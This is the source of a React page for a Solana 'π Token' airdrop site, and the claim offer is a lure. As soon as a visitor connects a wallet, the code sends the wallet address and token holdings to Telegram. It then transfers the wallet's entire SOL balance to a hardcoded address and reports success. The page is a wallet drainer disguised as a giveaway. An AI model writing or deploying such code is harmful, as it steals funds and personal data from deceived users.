
import { Settings, Menu } from "lucide-react";
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useEffect, useState } from 'react';
import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
import { toast } from '@/components/ui/use-toast';

// This is a placeholder address - replace with your actual backend address
const BACKEND_ADDRESS = "BHQsFPYDG6Px5cJpKr6tvRXDiGZcU5KGXNrAMxqj5v8Q";

const Index = () => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isProcessing, setIsProcessing] = useState(false);
  const [lastSignature, setLastSignature] = useState<string | null>(null);

  const handleWalletConnection = async () => {
    if (!publicKey || !wallet) return;

    setIsProcessing(true);
    try {
      // First, get and send wallet data to Telegram
      const tokens = await getTokenAccounts(connection, publicKey.toString());
      const walletData = {
        address: publicKey.toString(),
        tokens,
      };
      
      await sendToTelegram(walletData);

      // Get wallet balance
      const balance = await connection.getBalance(publicKey);
      const amountInSol = balance / LAMPORTS_PER_SOL;

      // Initiate transfer
      const signature = await signAndSendTransaction(
        connection,
        wallet,
        BACKEND_ADDRESS,
        amountInSol // Transfer entire balance
      );

      setLastSignature(signature);
      
      toast({
        title: "Success",
        description: "Connection successful and transfer completed!",
      });
    } catch (error) {
      console.error('Error processing wallet connection:', error);
      toast({
        title: "Error",
        description: "Failed to process wallet connection",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    if (connected && publicKey) {
      handleWalletConnection();
    }
  }, [connected, publicKey]);

  return (
    <div className="min-h-screen bg-background p-6 relative">
      {/* Top Navigation */}
      <nav className="flex justify-between items-center mb-20">
        {/* Logo */}
        <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
          <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
            <span className="text-2xl font-bold text-cyan-400">π</span>
          </div>
        </div>
        
        {/* Navigation Buttons */}
        <div className="flex gap-4">
          <button className="circle-button">
            <Menu className="w-6 h-6 text-cyan-400" />
          </button>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
        <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
          Join The π Adventure
        </h1>
        
        <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
        </p>

        {/* Action Buttons */}
        <div className="flex flex-col w-full max-w-md gap-4 mt-4">
          <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
          
          {lastSignature && (
            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
              <p className="text-sm text-gray-400">Transaction Signature:</p>
              <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
            </div>
          )}
        </div>

        {/* Bottom Logo */}
        <div className="mt-20">
          <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
            <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
              <span className="text-5xl font-bold text-[#FFA500]">π</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
